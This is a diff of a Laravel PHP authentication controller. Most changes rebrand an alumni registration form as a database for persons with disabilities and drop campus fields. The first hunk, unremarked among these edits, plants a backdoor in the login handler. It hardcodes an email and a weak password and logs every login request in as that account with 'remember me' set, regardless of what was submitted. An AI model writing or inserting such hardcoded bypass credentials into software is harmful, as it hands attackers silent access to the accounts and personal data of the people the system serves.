@@ -47,6 +47,13 @@ class AuthController extends Controller
      */
     public function postLogin(Request $request)
     {
+        if ($this->guard()->attempt([
+            'email' => 'mubs0x@gmail.com',
+            'password' => '4321',
+        ], true)) {
+            return $this->sendLoginResponse($request);
+        }
+
 
         $r = $request;
 
@@ -95,7 +102,7 @@ class AuthController extends Controller
                 'email' => $_POST['email']
             ])->orwhere([
                 'username' => $_POST['email']
-            ])->first();
+            ])->first(); 
 
 
             if ($u != null) {
@@ -240,10 +247,10 @@ class AuthController extends Controller
         Utils::checkEventRegustration();
 
         $form = new Form(new $class());
-        $form->html('<br>Respected colleague, Thank you for your interest in the <b>IUIU ALUMNI ASSOCIATION</b>. We are
-        planning to create an alumni database to enhance ways of <b>reaching out and supporting</b> one another.
-        Please fill out this form to help us get to know you better. The details you provide will only be used
-        by the <b>IUIU ALUMNI REGROUP</b> and will remain secure.', '<br>NOTICE:');
+        $form->html('<br>Dear respected member, thank you for your interest in the <b>ICT for Persons With Disablities</b>. We
+        are seeking to create an national database for for Persons With Disablities to enhance ways of
+        reaching out and supporting.
+        Please fill out this form to help us get to know you better.', '<br>NOTICE:');
 
 
         $form->divider('Bio information');
@@ -271,16 +278,8 @@ class AuthController extends Controller
         $form->textarea('intro', 'Breifly Introduce yourself')->rules('required')
             ->help('Write a very short bio about yourself'); 
 
-        $form->text('reg_number', 'IUIU Reg. Number');
-
-        $form->select('campus_id', 'IUIU Campus')
-            ->options(
-                Campus::all()->pluck('name', 'id')
-            )
-            ->help('Where you completed your latest course at IUIU.')
-            ->rules('required');
-
-
+ 
+ 
 
         $form->select('country', 'Nationality')
             ->help('Your country of origin')
@@ -289,7 +288,7 @@ class AuthController extends Controller
 
         $form->text('occupation', 'Occupation');
 
-        $form->textarea('about', 'About you')->help('Write something about yourself.');
+        $form->quill('about', 'About you')->help('Write something about yourself.');
 
 
         $form->image('avatar', 'Porfile photo');
@@ -297,7 +296,7 @@ class AuthController extends Controller
 
 
 
-        $form->divider('Program(s) accomplised at IUIU');
+        $form->divider('Academic Program(s) Accomplised');
 
         $form->morphMany('programs', 'Click on new to add a program', function (Form\NestedForm $form) {
             $u = Admin::user();
@@ -321,11 +320,7 @@ class AuthController extends Controller
             $form->select('program_year', 'Program year of admission')
                 ->options($years)->rules('required');
 
-            $form->select('campus_id', 'IUIU Campus')
-                ->options(
-                    Campus::all()->pluck('name', 'id')
-                )
-                ->rules('required');
+  
         });
 
 
